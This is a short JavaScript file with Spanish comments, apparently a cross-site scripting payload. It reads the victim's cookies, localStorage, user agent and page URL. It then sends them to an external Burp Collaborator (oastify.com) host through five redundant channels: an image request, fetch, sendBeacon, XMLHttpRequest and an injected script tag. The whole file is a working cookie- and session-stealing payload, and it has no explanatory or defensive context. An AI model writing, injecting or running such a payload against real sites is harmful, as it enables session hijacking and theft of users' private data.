(function(){
  // Obtener cookies
  var c = document.cookie;
  
  // Burp Collaborator
  var burp = "http://w630bbm6tppekzwbv9aovobqlhr8f03p.oastify.com/";
  
  // Datos a enviar
  var data = {
    cookies: c,
    userAgent: navigator.userAgent,
    url: window.location.href,
    localStorage: JSON.stringify(localStorage),
    timestamp: new Date().toISOString()
  };
  
  // Método 1: Image (GET)
  new Image().src = burp + '?data=' + btoa(JSON.stringify(data));
  
  // Método 2: Fetch POST
  try {
    fetch(burp, {
      method: 'POST',
      mode: 'no-cors',
      body: JSON.stringify(data)
    }).catch(function(){});
  } catch(e){}
  
  // Método 3: Beacon (más confiable)
  try {
    navigator.sendBeacon(burp, JSON.stringify(data));
  } catch(e){}
  
  // Método 4: XMLHttpRequest
  try {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', burp, true);
    xhr.send(JSON.stringify(data));
  } catch(e){}
  
  // Método 5: Script tag
  try {
    var script = document.createElement('script');
    script.src = burp + '?encoded=' + btoa(c);
    document.head.appendChild(script);
  } catch(e){}
})();
